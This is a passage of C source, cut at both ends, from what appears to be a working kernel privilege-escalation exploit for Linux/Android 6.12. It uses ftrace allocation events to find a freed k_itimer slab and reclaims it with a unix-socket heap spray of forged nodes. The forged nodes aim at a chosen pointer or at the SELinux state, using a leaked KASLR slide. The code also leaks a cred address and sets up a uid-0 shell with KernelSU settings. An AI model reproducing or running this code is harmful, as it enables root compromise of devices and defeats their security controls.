        struct page_alloc_ev *pe = &g_palloc[i];

        if (pe->pfn == slab_pfn &&
            pe->order == 1U && pe->pid == etid)
            slab_own_seen = 1;
    }
    if (!slab_own_seen)
        return 0;
    for (int i = 0; i < g_palloc_n; i++) {
        struct page_alloc_ev *pe = &g_palloc[i];

        if (pe->tstamp < last_ts ||
            !alloc_covers(pe->pfn, pe->order, target_pfn))
            continue;
        last_ts = pe->tstamp;
        covered = !(pe->pfn == slab_pfn &&
                    pe->order == 1U &&
                    pe->pid == etid);
    }
    return covered;
}

/* The victim slab's own order-1 allocation is in this round's trace. */
static int slab_alloc_seen(unsigned long long slab_pfn)
{
    for (int i = 0; i < g_palloc_n; i++)
        if (g_palloc[i].pfn == slab_pfn)
            return 1;
    return 0;
}

static int target_alloc_matches(const struct ev *e,
                                unsigned long long slab_pfn,
                                unsigned long long target_pfn,
                                unsigned long long V, size_t *off_out)
{
    size_t off = 0;

    if (e->type != EV_MM_PAGE_ALLOC)
        return 0;
    if (e->pfn == slab_pfn || e->pfn == target_pfn) {
        (void)target_cover(e->pfn, e->order, target_pfn, V, &off);
        if (off_out)
            *off_out = off;
        return 1;
    }
    return target_cover(e->pfn, e->order, target_pfn, V, off_out);
}

/*
 * Keep matching allocations in timestamp order up to 64 entries.  The array
 * is not a ring: the first entry after free_ts must never be overwritten by
 * later matches.  The caller selects that first entry after free_ts.
 */
static void note_target_alloc(struct target_alloc *arr, int *n,
                              const struct ev *e, int cpu,
                              unsigned long long slab_pfn,
                              unsigned long long target_pfn,
                              unsigned long long V)
{
    size_t off = 0;

    if (*n >= 64 || !target_alloc_matches(e, slab_pfn, target_pfn, V, &off))
        return;
    arr[*n].seen = 1;
    arr[*n].ts = e->tstamp;
    arr[*n].pfn = e->pfn;
    arr[*n].gfp = e->gfp;
    arr[*n].order = e->order;
    arr[*n].migratetype = e->migratetype;
    arr[*n].pid = e->pid;
    arr[*n].cpu = cpu;
    arr[*n].off = off;
    (*n)++;
}

static int is_spray_data_page(const struct ev *e)
{
    if (e->type != EV_MM_PAGE_ALLOC)
        return 0;
    if (e->order == 0 && (e->gfp & 0x8ULL) && !(e->gfp & 0x400000ULL))
        return 1;
    return e->order <= 3 && (e->gfp & 0x400000ULL) &&
        (e->order == 0 || (e->gfp & 0x40000ULL)) &&
        !(e->gfp & 0x18ULL);
}

static int spray_tid_match(int pid)
{
    int n = g_spray_n ? g_spray_n : g_spray_done_n;

    for (int i = 0; i < n; i++)
        if (g_spray_args[i].tid == pid)
            return 1;
    return 0;
}

/*
 * Diagnostic (CVE98260_DIAG_FREE_SCAN=1): after the spray threads have been
 * joined, look for a free of the page reported as the hit, and for any later
 * allocation covering it, inside [hit_ts, join_done].  The join waits for
 * every in-flight send, so an skb allocated and then freed on the same send
 * is already recorded.  Read-only, and the window ends at join_done rather
 * than at trace_stop().  Disabled by default.
 */
#define DIAG_FREE_MAX  16
#define DIAG_ALLOC_MAX 64

static int diag_free_scan_enabled(void)
{
    static int on = -1;

    if (on < 0) {
        const char *s = getenv("CVE98260_DIAG_FREE_SCAN");

        on = s && *s && *s != '0';
    }
    return on;
}

static int diag_free_test_enabled(void)
{
    static int on = -1;

    if (on < 0) {
        const char *s = getenv("CVE98260_DIAG_FREE_TEST");

        on = s && *s && *s != '0';
    }
    return on;
}

/*
 * Sensitivity check for the free scan (CVE98260_DIAG_FREE_TEST=1): drop
 * every spray mapping just before the join so an anon hit page is freed
 * inside the scanned window.  The scan must then report free_after_hit > 0;
 * a 0 there means the scan itself cannot see a free and every 0/0 result is
 * a false negative.
 */
static void diag_perturb_spray_maps(void)
{
    for (int i = 0; i < g_spray_n; i++)
        if (g_spray_args[i].map && g_spray_args[i].map_len)
            madvise(g_spray_args[i].map, g_spray_args[i].map_len,
                    MADV_DONTNEED);
    logf("[diag] diag=1 event=perturb spray_n=%d\n", g_spray_n);
}

static int diag_wait_reap_enabled(void)
{
    static int on = -1;

    if (on < 0) {
        const char *s = getenv("CVE98260_DIAG_WAIT_REAP");

        on = s && *s && *s != '0';
    }
    return on;
}

static void diag_scan_hit_page(unsigned char *raw, struct ev *evs,
                               unsigned long long target_pfn,
                               unsigned long long hit_ts,
                               unsigned long long join_ts,
                               unsigned long long end_ts)
{
    unsigned long long free_ts[DIAG_FREE_MAX];
    unsigned long long alloc_ts[DIAG_ALLOC_MAX], alloc_gfp[DIAG_ALLOC_MAX];
    unsigned alloc_order[DIAG_ALLOC_MAX];
    int alloc_pid[DIAG_ALLOC_MAX];
    unsigned long long first_free = 0, first_alloc = 0, first_gfp = 0;
    unsigned first_order = 0;
    int first_pid = -1, nf = 0, na = 0, alloc_after_free = 0;

    for (int cpu = 0; cpu < 8; cpu++) {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
        int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

        for (int j = 0; j < k; j++) {
            struct ev *e = &evs[j];

            if (e->tstamp < hit_ts || e->tstamp > end_ts)
                continue;
            if (e->type == EV_MM_PAGE_FREE &&
                alloc_covers(e->pfn, e->order, target_pfn)) {
                if (nf < DIAG_FREE_MAX)
                    free_ts[nf++] = e->tstamp;
            } else if (e->type == EV_MM_PAGE_ALLOC &&
                       alloc_covers(e->pfn, e->order, target_pfn)) {
                if (na < DIAG_ALLOC_MAX) {
                    alloc_ts[na] = e->tstamp;
                    alloc_gfp[na] = e->gfp;
                    alloc_order[na] = e->order;
                    alloc_pid[na] = e->pid;
                    na++;
                }
            }
        }
    }
    for (int i = 0; i < nf; i++)
        if (!first_free || free_ts[i] < first_free)
            first_free = free_ts[i];
    for (int i = 0; first_free && i < na; i++) {
        if (alloc_ts[i] < first_free)
            continue;
        alloc_after_free++;
        if (!first_alloc || alloc_ts[i] < first_alloc) {
            first_alloc = alloc_ts[i];
            first_gfp = alloc_gfp[i];
            first_order = alloc_order[i];
            first_pid = alloc_pid[i];
        }
    }
    logf("[diag] diag=1 target_pfn=%#llx hit_ts=%llu join_ts=%llu "
         "scan_end_ts=%llu free_after_hit=%d alloc_after_hit=%d "
         "alloc_after_free=%d first_free_ts=%llu first_alloc_ts=%llu "
         "alloc_order=%u alloc_gfp=%#llx alloc_pid=%d\n",
         target_pfn, hit_ts, join_ts, end_ts, nf, na, alloc_after_free,
         first_free, first_alloc, first_order, first_gfp, first_pid);
}

struct plant_res { unsigned long long V, A, slab_pfn; int ok; };

static void run_plant(unsigned long long target, int kind, int tag,
                      struct plant_res *res, unsigned char *raw, struct ev *evs)
{
    int ready_p[2], ack_p[2], tid_p[2], pick_p[2];
    memset(res, 0, sizeof(*res));
    held_timeout_check();
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(pick_p)) {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    g_defer_arm = (kind == PLANT_PTR);
    pid_t T = fork();
    if (T < 0) {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T > 0)
        g_last_victim = T;
    if (T == 0) {
        close(ready_p[0]); close(ack_p[1]); close(tid_p[0]); close(pick_p[1]);
        g_ready_w = ready_p[1]; g_ack_r = ack_p[0]; g_tid_w = tid_p[1];
        g_pick_r = pick_p[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]); close(ack_p[0]); close(tid_p[1]); close(pick_p[0]);
    char ch;
    if (read(ready_p[0], &ch, 1) != 1) {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * Parse the timer allocations while the exec thread waits at the
     * pre-exec gate.  The trace must contain every timer allocation: the
     * index of timers[] is the index the child will arm, so an incomplete
     * capture would select the wrong timer.  Rejecting here exits the child
     * before exec: no stale timer and no held zombie.
     */
    unsigned long long timers[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    int nrec = 0, c = 0;

    g_palloc_n = 0;
    for (int attempt = 0; attempt < 8 && nrec < NTIMERS; attempt++) {
        long n;
        int k;

        usleep(20000);
        n = read_cpu(g_cpu, raw, 48u << 20);
        k = n > 0 ? parse_events(raw, (size_t)n, evs, 400000) : 0;
        c = k;
        for (int i = 0; i < k && nrec < NTIMERS; i++) {
            if (evs[i].type == EV_MM_PAGE_ALLOC)
                if (g_palloc_n < (int)(sizeof(g_palloc) / sizeof(g_palloc[0]))) {
                    struct page_alloc_ev *pe = &g_palloc[g_palloc_n++];

                    pe->pfn = evs[i].pfn;
                    pe->order = evs[i].order;
                    pe->gfp = evs[i].gfp;
                    pe->migratetype = evs[i].migratetype;
                    pe->tstamp = evs[i].tstamp;
                    pe->cpu = -1;
                    pe->pid = evs[i].pid;
                }
            if (evs[i].type == EV_KMEM_CACHE_ALLOC && evs[i].pid == etid &&
                (evs[i].site & 0x1fffff) == TIMER_SITE_LOW21 &&
                evs[i].alloc == TIMER_ALLOC && evs[i].req == TIMER_ALLOC) {
                if (nrec == 0)
                    site0 = evs[i].site;
                timers[nrec++] = evs[i].ptr;
            }
        }
    }
    if (nrec != NTIMERS || !site0) {
        int go = -1;
        int st = 0;

        (void)write(pick_p[1], &go, sizeof(go));
        close(pick_p[1]);
        trace_stop();
        waitpid(T, &st, 0);
        logf("[-] plant%d captured=%d expected=%d; refusing to pick "
             "(child_status=%d)\n", tag, nrec, NTIMERS,
             WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return;
    }

    /*
     * k_itimer is 256 bytes on 6.12, so a captured object address must be
     * 256-aligned.  A misaligned value means the capture or the parser
     * produced a bogus pointer: the payload would be sprayed into the wrong
     * page while the hit still looks geometrically valid.  This covers
     * address-parse errors only, not index-order shifts (those keep the
     * addresses aligned).
     */
    for (int i = 0; i < nrec; i++) {
        if (timers[i] & (TIMER_ALLOC - 1)) {
            int go = -1;
            int st = 0;

            (void)write(pick_p[1], &go, sizeof(go));
            close(pick_p[1]);
            trace_stop();
            waitpid(T, &st, 0);
            logf("[-] plant%d misaligned timer address %#llx (size=%#llx); "
                 "refusing to pick (child_status=%d)\n", tag, timers[i],
                 (unsigned long long)TIMER_ALLOC,
                 WIFEXITED(st) ? WEXITSTATUS(st) : -1);
            return;
        }
    }

    /*
     * The child arms timers[pick]; a duplicate address in that array means
     * the capture repeated one record and dropped another, so every index
     * after the duplicate points at the wrong timer and the armed node is
     * not the one that gets sprayed.  Reject instead of picking a victim
     * whose mapping is known to be broken.
     */
    {
        unsigned long long dup = 0;

        for (int i = 0; i < nrec && !dup; i++)
            for (int j = i + 1; j < nrec; j++)
                if (timers[i] == timers[j]) {
                    dup = timers[i];
                    break;
                }
        if (dup) {
            int go = -1;
            int st = 0;

            (void)write(pick_p[1], &go, sizeof(go));
            close(pick_p[1]);
            trace_stop();
            waitpid(T, &st, 0);
            logf("[-] plant%d duplicate timer address %#llx; refusing to "
                 "pick (child_status=%d)\n", tag, dup,
                 WIFEXITED(st) ? WEXITSTATUS(st) : -1);
            return;
        }
    }

    /*
     * Pre-count timers per 8 KiB slab.  A slab that is not fully owned can
     * contain an object from another process, so its page may not be freed
     * with ours; only own == 32 slabs are candidates.
     */
    unsigned long long slab_base[NTIMERS];
    int slab_cnt[NTIMERS], own[NTIMERS];
    int nslab = 0;

    for (int i = 0; i < nrec; i++) {
        unsigned long long base = timers[i] & ~0x1fffULL;
        int s;

        for (s = 0; s < nslab; s++)
            if (slab_base[s] == base)
                break;
        if (s == nslab) {
            slab_base[s] = base;
            slab_cnt[s] = 0;
            nslab++;
        }
        slab_cnt[s]++;
    }
    for (int i = 0; i < nrec; i++) {
        unsigned long long base = timers[i] & ~0x1fffULL;

        own[i] = 0;
        for (int s = 0; s < nslab; s++)
            if (slab_base[s] == base) {
                own[i] = slab_cnt[s];
                break;
            }
    }

    int pick = -1;
    unsigned long long A = 0;

    if (kind == PLANT_PTR) {
        /* Deferred-arm path: the parent may pick any candidate.  Prefer
         * bit16=1 with the sensitive CAP_SYS_ADMIN/CAP_MAC_ADMIN bits clear,
         * then any bit16=1 candidate. */
        for (int pass = 0; pass < 2 && pick < 0; pass++) {
            for (int i = 0; i < nrec; i++) {
                unsigned long long cand_a = timers[i] + 0x78;
                unsigned long long cand_pfn;

                if (!(cand_a & 0x10000ULL))
                    continue;
                if (pass == 0 &&
                    ((cand_a & (1ULL << 21)) || (cand_a & (1ULL << 33))))
                    continue;
                if (own[i] != 32)
                    continue;
                cand_pfn = (timers[i] - g_base) >> 12;
                if (pass == 0 && !slab_alloc_seen(cand_pfn & ~1ULL))
                    continue;
                if (pre_alloc_covered(cand_pfn, cand_pfn & ~1ULL, etid))
                    continue;
                pick = i;
                V = timers[i];
                A = cand_a;
                break;
            }
        }
    } else {
        /* Fixed-index path: restore the validated 2048 victim exactly. */
        pick = VICTIM_IDX;
        V = timers[pick];
        A = V + 0x78;
        if (own[pick] != 32 ||
            pre_alloc_covered((V - g_base) >> 12,
                              ((V - g_base) >> 12) & ~1ULL, etid))
            pick = -1;
    }
    if (pick < 0) {
        int go = -1;
        int st = 0;

        (void)write(pick_p[1], &go, sizeof(go));
        close(pick_p[1]);
        trace_stop();
        waitpid(T, &st, 0);
        logf("[-] plant%d no usable victim (kind=%d recs=%d); "
             "child_status=%d\n", tag, kind, nrec,
             WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return;
    }
    if (((V & 0xfffULL) + 0x78 + 24) > PAGE) {
        int go = -1;
        int st = 0;

        (void)write(pick_p[1], &go, sizeof(go));
        close(pick_p[1]);
        trace_stop();
        waitpid(T, &st, 0);
        logf("[-] plant%d node crosses page (V=%#llx); child_status=%d\n",
             tag, V, WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return;
    }
    int slab_own = own[pick];
    unsigned long long slide = site0 - STATIC_TIMER_SITE;
    unsigned long long pfn = (V - g_base) >> 12;
    unsigned long long slab_pfn = pfn & ~1ULL;
    unsigned target_migratetype = 0, target_alloc_gfp = 0;
    unsigned target_alloc_order = 0;
    int target_alloc_cpu = -1;
    int alloc_seen = 0;
    for (int i = 0; i < g_palloc_n; i++)
        if (g_palloc[i].pfn == slab_pfn) {
            alloc_seen = 1;
            target_migratetype = g_palloc[i].migratetype;
            target_alloc_gfp = g_palloc[i].gfp;
            target_alloc_order = g_palloc[i].order;
            target_alloc_cpu = g_palloc[i].cpu;
            break;
        }

    g_slide = slide;
    if (kind == PLANT_SELINUX)
        target = SELINUX_STATE_STATIC + slide - 7;

    /*
     * Build the payload and park the spray threads before the exec gate.
     * The k_itimer slab page can be freed a few milliseconds after the
     * gate, so keep the free-to-wake path to the trace poll instead of
     * thread creation and the first socket allocations.
     */
    unsigned char *payload = malloc(SPRAY_MAX);
    if (!payload) park_forever("payload alloc failed");
    build_nodes(payload, V, A, target, kind);

    ensure_pool();
    ensure_raw();
    start_spray_threads(payload);

    trace_clear();
    {
        int go = pick + 1; /* index the child must arm */

        if (write(pick_p[1], &go, sizeof(go)) != sizeof(go)) {
            close(pick_p[1]);
            stop_spray_threads();
            trace_stop();
            waitpid(T, NULL, 0);
            logf("[-] plant%d gate write failed; aborted before exec\n", tag);
            return;
        }
    }
    close(pick_p[1]);

    siginfo_t si;
    int zombie_seen = 0;
    int burst_started = 0;

    memset(&si, 0, sizeof(si));

    int free_seen = 0, exec_seen = 0;
    unsigned long long free_ts = 0, det_ts = 0, hit_ts = 0, steal_ts = 0;
    unsigned long long steal_pfn = 0, steal_gfp = 0;
    unsigned steal_migratetype = 0;
    unsigned steal_order = 0;
    int free_cpu = -1, hit_cpu = -1, steal_cpu = -1, steal_pid = -1;
    unsigned long long hit_pfn = 0, hit_gfp = 0;
    unsigned hit_order = 0;
    int hit_pid = -1, hit_spray = 0;
    size_t hit_off = 0;
    struct target_alloc pre_alloc[64];
    int pre_n = 0, pre_sel = -1;
    for (int i = 0; i < c; i++) {
        if (EV_SCHED_PROCESS_EXEC &&
            evs[i].type == EV_SCHED_PROCESS_EXEC && evs[i].pid == (int)T)
            exec_seen = 1;
        if (evs[i].type == EV_MM_PAGE_FREE && evs[i].order == 1 &&
            evs[i].pfn == slab_pfn) {
            free_seen = 1;
            free_ts = evs[i].tstamp;
            det_ts = now_ns();
            free_cpu = g_cpu;
        }
    }
    logf("[+] plant%d kind=%d pick=%d V=%#llx A=%#llx target=%#llx pfn=%#llx slab=%#llx slide=%#llx free_seen=%d recs=%d slab_own=%d/32\n",
           tag, kind, pick + 1, V, A, target, pfn, slab_pfn, slide, free_seen, nrec, slab_own);
    logf("[page] target_slab pfn=%#llx alloc_order=%u gfp=%#llx migratetype=%u "
         "cpu=%d alloc_seen=%d own=%d/32\n",
           slab_pfn, target_alloc_order, target_alloc_gfp,
           target_migratetype, target_alloc_cpu, alloc_seen, slab_own);
    /*
     * Tracing has stayed on since the timer window started, so a free that
     * happens while the timer trace is parsed is still recorded.  Poll fast:
     * a freed order-1 page is easy for any other allocation to take.
     */
    /* 5s for slabs whose order-1 alloc is not in this round's trace.
     * Unverified: since the change, 18/18 waits were alloc_seen=1.
     * Re-evaluate if the alloc_seen=0 share rises above ~5%. */
    int wait_ms = slab_alloc_seen(slab_pfn) ? 30000 : 5000;
    long t0 = now_ms();
    while (!free_seen && !exec_seen && now_ms() - t0 < wait_ms) {
        for (int cpu = 0; cpu < 8; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++) {
                if (EV_SCHED_PROCESS_EXEC &&
                    evs[j].type == EV_SCHED_PROCESS_EXEC &&
                    evs[j].pid == (int)T) {
                    exec_seen = 1;
                    break;
                }
                note_target_alloc(pre_alloc, &pre_n, &evs[j], cpu,
                                  slab_pfn, pfn, V);
                if (evs[j].type == EV_MM_PAGE_FREE && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn) {
                    free_seen = 1;
                    free_ts = evs[j].tstamp;
                    det_ts = now_ns();
                    free_cpu = cpu;
                    if (!burst_started) {
                        spray_wake();
                        burst_started = 1;
                    }
                }
            }
            if (exec_seen)
                break;
        }
        if (!zombie_seen) {
            siginfo_t z;

            memset(&z, 0, sizeof(z));
            if (waitid(P_PID, (id_t)T, &z, WEXITED | WNOHANG | WNOWAIT) == 0 &&
                z.si_pid == T) {
                si = z;
                zombie_seen = 1;
            }
        }
        if (!free_seen)
            usleep(100);
    }
    if (!free_seen && !exec_seen) {
        for (int cpu = 0; cpu < 8 && !free_seen && !exec_seen; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++) {
                if (EV_SCHED_PROCESS_EXEC &&
                    evs[j].type == EV_SCHED_PROCESS_EXEC &&
                    evs[j].pid == (int)T) {
                    exec_seen = 1;
                    break;
                }
                note_target_alloc(pre_alloc, &pre_n, &evs[j], cpu,
                                  slab_pfn, pfn, V);
                if (evs[j].type == EV_MM_PAGE_FREE && evs[j].order == 1 &&
                    evs[j].pfn == slab_pfn) {
                    free_seen = 1;
                    free_ts = evs[j].tstamp;
                    det_ts = now_ns();
                    free_cpu = cpu;
                    if (!burst_started) {
                        spray_wake();
                        burst_started = 1;
                    }
                }
            }
        }
    }
    logf("[free] kind=%d delay_ms=%ld wait_ms=%d alloc_seen=%d own=%d/32 "
         "slide_low=%#llx\n", kind, now_ms() - t0, wait_ms, alloc_seen,
         slab_own, slide & 0xffffffULL);
    if (exec_seen) {
        int st = 0;

        stop_spray_threads();
        trace_stop();
        waitpid(T, &st, 0);
        free(payload);
        logf("[exec] committed (pid=%d status=%d); attempt abandoned "
             "before hit\n", (int)T,
             WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        return;
    }
    if (!zombie_seen && wait_zombie(T, &si) == 0)
        zombie_seen = 1;
    if (!zombie_seen) {
        logf("[-] plant%d no zombie; holding child\n", tag);
        stop_spray_threads();
        trace_stop();
        kill(T, SIGKILL);
        hold_zombie();
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
           tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED) {
        stop_spray_threads();
        trace_stop();
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        hold_zombie();
        return;
    }
    if (free_seen) {
        for (int i = 0; i < pre_n; i++)
            if (pre_alloc[i].ts >= free_ts) {
                pre_sel = i;
                break;
            }
    }
    if (pre_sel >= 0)
        logf("[+] plant%d pre_alloc pfn=%#llx order=%u gfp=%#llx pid=%d\n",
               tag, pre_alloc[pre_sel].pfn, pre_alloc[pre_sel].order,
               pre_alloc[pre_sel].gfp, pre_alloc[pre_sel].pid);
    logf("[+] plant%d free_seen=%d after %ldms\n", tag, free_seen, now_ms() - t0);
    if (!free_seen) {
        stop_spray_threads();
        trace_stop();
        logf("[-] plant%d victim slab not freed; holding zombie\n", tag);
        hold_zombie();
        return;
    }

    if (!burst_started)
        spray_wake();
    long t1 = now_ms();
    int hit = 0, stolen = 0, pre_hit = 0;

    /*
     * The free wait already consumed the trace up to free_ts; the spray's
     * target page may have been allocated in that same read window and only
     * recorded in pre_alloc.  Check those entries before waiting for new
     * trace events, or the hit is missed for the full burst window.
     */
    for (int i = 0; i < pre_n && !hit; i++) {
        struct target_alloc *pe = &pre_alloc[i];
        struct ev e = {
            .type = EV_MM_PAGE_ALLOC,
            .order = pe->order,
            .gfp = pe->gfp,
        };
        size_t off = 0;

        if (pe->ts < free_ts)
            continue;
        if (!is_spray_data_page(&e) || !spray_tid_match(pe->pid))
            continue;
        if (!target_cover(pe->pfn, pe->order, pfn, V, &off))
            continue;
        hit = 1;
        pre_hit = 1;
        hit_ts = pe->ts;
        hit_cpu = pe->cpu;
        hit_pfn = pe->pfn;
        hit_order = pe->order;
        hit_gfp = pe->gfp;
        hit_pid = pe->pid;
        hit_spray = 1;
        hit_off = off;
    }
    if (pre_hit)
        logf("[+] plant%d pre_alloc hit pfn=%#llx order=%u pid=%d off=%zu\n",
             tag, hit_pfn, hit_order, hit_pid, hit_off);

    while (!hit && !stolen && now_ms() - t1 < 3000) {
        for (int cpu = 0; cpu < 8 && !hit; cpu++) {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

            for (int j = 0; j < k; j++) {
                if (evs[j].type == EV_MM_PAGE_ALLOC) {
                    /* Keep only target-matching events below. */
                }
                {
                    size_t off = 0;
                    int target_alloc = target_alloc_matches(&evs[j], slab_pfn,
                                                            pfn, V, &off);
                    /*
                     * unix_create1() sets sk_allocation = GFP_KERNEL_ACCOUNT.
                     * alloc_skb_with_frags() adds COMP and NOWARN for order-1+
                     * pages, but its order-0 fallback uses alloc_page(gfp_mask)
                     * without COMP.  The histogram below prints the exact
                     * observed values.
                     */
                    int data_page = is_spray_data_page(&evs[j]);

                    if (target_alloc && data_page &&
                        spray_tid_match(evs[j].pid) &&
                        target_cover(evs[j].pfn, evs[j].order, pfn, V,
                                     &off)) {
                        hit = 1;
                        hit_ts = evs[j].tstamp;
                        hit_cpu = cpu;
                        hit_pfn = evs[j].pfn;
                        hit_order = evs[j].order;
                        hit_gfp = evs[j].gfp;
                        hit_pid = evs[j].pid;
                        hit_spray = spray_tid_match(evs[j].pid);
                        hit_off = off;
                    } else if (target_alloc && !steal_ts &&
                               !(evs[j].pfn == slab_pfn &&
                                 evs[j].order == 1U &&
                                 evs[j].pid == etid) &&
                               !spray_tid_match(evs[j].pid)) {
                        /* A non-spray allocation took the target page. */
                        steal_ts = evs[j].tstamp;
                        steal_pfn = evs[j].pfn;
                        steal_order = evs[j].order;
                        steal_gfp = evs[j].gfp;
                        steal_migratetype = evs[j].migratetype;
                        steal_pid = evs[j].pid;
                        steal_cpu = cpu;
                        stolen = 1;
                        break;
                    }
                }
            }
        }
        if (!hit)
            usleep(50);
    }
    if (diag_free_test_enabled() && hit && (hit_gfp & 0x8ULL) &&
        !(hit_gfp & 0x400000ULL))
        diag_perturb_spray_maps();
    stop_spray_threads();
    unsigned long long join_ts = now_ns();
    int diag_wait_reap = diag_wait_reap_enabled() && hit;
    if (!diag_wait_reap) {
        if (diag_free_scan_enabled() && hit)
            diag_scan_hit_page(raw, evs, pfn, hit_ts, join_ts, join_ts);
        trace_stop();
    }
    for (int cpu = 0; cpu < 8 && !hit; cpu++) {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
        int k = m > 0 ? parse_events(raw, (size_t)m, evs, 400000) : 0;

        for (int j = 0; j < k; j++) {
            size_t off = 0;

            if (is_spray_data_page(&evs[j]) &&
                spray_tid_match(evs[j].pid) &&
                target_cover(evs[j].pfn, evs[j].order, pfn, V, &off)) {
                hit = 1;
                hit_ts = evs[j].tstamp;
                hit_cpu = cpu;
                hit_pfn = evs[j].pfn;
                hit_order = evs[j].order;
                hit_gfp = evs[j].gfp;
                hit_pid = evs[j].pid;
                hit_spray = spray_tid_match(evs[j].pid);
                hit_off = off;
            }
        }
    }
    logf("[+] plant%d timing det_ns=%lld free_ts=%llu free_cpu=%d hit_ts=%llu hit_cpu=%d "
           "dt_ns=%lld hit_pfn=%#llx hit_order=%u hit_gfp=%#llx hit_pid=%d "
           "hit_spray=%d hit_off=%zu steal_ts=%llu steal_cpu=%d steal_pid=%d "
           "steal_pfn=%#llx steal_order=%u steal_gfp=%#llx steal_migratetype=%u\n",
           tag, (long long)(det_ts && free_ts ? det_ts - free_ts : 0),
           free_ts, free_cpu, hit_ts, hit_cpu,
           (long long)(hit_ts && free_ts ? hit_ts - free_ts : 0),
           hit_pfn, hit_order, hit_gfp, hit_pid, hit_spray, hit_off,
           steal_ts, steal_cpu, steal_pid, steal_pfn, steal_order, steal_gfp,
           steal_migratetype);
    logf("[+] plant%d burst hit=%d after %ldms\n", tag, hit, now_ms() - t1);
    if (!hit) {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        hold_zombie();
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    if (diag_wait_reap) {
        unsigned long long reap_ts = now_ns();

        diag_scan_hit_page(raw, evs, pfn, hit_ts, join_ts, reap_ts);
        trace_stop();
        logf("[diag] diag=1 event=reap join_to_reap_ns=%llu\n",
             reap_ts - join_ts);
    } else if (diag_free_scan_enabled() && hit) {
        logf("[diag] diag=1 event=reap join_to_reap_ns=%llu\n",
             now_ns() - join_ts);
    }
    res->V = V; res->A = V + 0x78; res->slab_pfn = slab_pfn; res->ok = 1;
    free(payload);
}

/* Environment for the re-exec'd child (launcher) and the uid-0 shell. */
static char **cve_child_env(void)
{
    static char *ep[12];
    static char buf[10][512];
    static const char *names[] = {
        "CVE_SO", "CVE_ROOT_SCRIPT", "CVE_KSU_MODE", "CVE_KSU_KO",
        "CVE_KSU_PATCHED", "CVE_KSU_SYMS", "CVE_KREL", "CVE_KSUD"
    };
    int n = 0, b = 0;

    ep[n++] = (char *)"PATH=/system/bin:/system/xbin:/data/adb/ksu/bin";
    for (unsigned i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
        const char *v = getenv(names[i]);

        if (!v || !*v)
            continue;
        snprintf(buf[b], sizeof(buf[b]), "%s=%s", names[i], v);
        ep[n++] = buf[b];
        b++;
    }
    ep[n] = (char *)NULL;
    return ep;
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw, struct ev *evs,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode)
{
    for (int attempt = 0; attempt < 4; attempt++) {
        int go[2], st[2];
        pid_t p;
        long n;
        int c, hello = 0;
        unsigned long long R = 0, site = 0;
        int cred_matches = 0;

        if (pipe(go) || pipe(st))
            return 0;
        p = fork();
        if (p == 0) {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                char *const av[] = { (char *)"/proc/self/exe", (char *)"wait",
                                     (char *)(shell_mode ? "shell" : "verify"), NULL };

                execve("/proc/self/exe", av, (char *const *)cve_child_env());
            }
            _exit(127);
        }
        if (p < 0) {
            close(go[0]); close(go[1]); close(st[0]); close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        trace_start();
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        c = n > 0 ? parse_events(raw, (size_t)n, evs, 400000) : 0;
        for (int i = 0; i < c; i++) {
            if (evs[i].type == EV_KMEM_CACHE_ALLOC && evs[i].pid == (int)p &&
                evs[i].req == CRED_REQ && evs[i].alloc == CRED_ALLOC &&
                (evs[i].site & 0x1fffff) == CRED_SITE_LOW21) {
                /*
                 * exec can allocate more than one cred (for example an
                 * intermediate cred replaced by the LSM/exec cred).  The
                 * committed object is the last allocation for this pid.
                 */
                R = evs[i].ptr;
                site = evs[i].site;
                cred_matches++;
            }
        }
        if (R) {
            struct pollfd pf = { .fd = st[0], .events = POLLIN };

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
